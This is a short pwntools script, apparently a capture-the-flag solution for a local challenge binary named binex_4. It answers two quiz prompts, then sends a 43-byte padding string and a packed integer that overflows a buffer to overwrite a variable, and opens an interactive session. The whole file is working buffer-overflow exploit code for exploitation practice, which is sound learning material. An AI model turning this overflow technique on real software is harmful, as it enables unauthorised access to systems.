from pwn import *

io = process('./binex_4')

# payload1 = b'Sir Lancelot of Camelot'
# payload2 = b'To seek the Holy Grail.'
payload3 = flat([
    b'A'*43,
    -0x215eef38
])

io.sendlineafter(b'What', b'Sir Lancelot of Camelot')
io.sendlineafter(b'What', b'To seek the Holy Grail.')
io.sendlineafter(b'What', payload3)

io.interactive()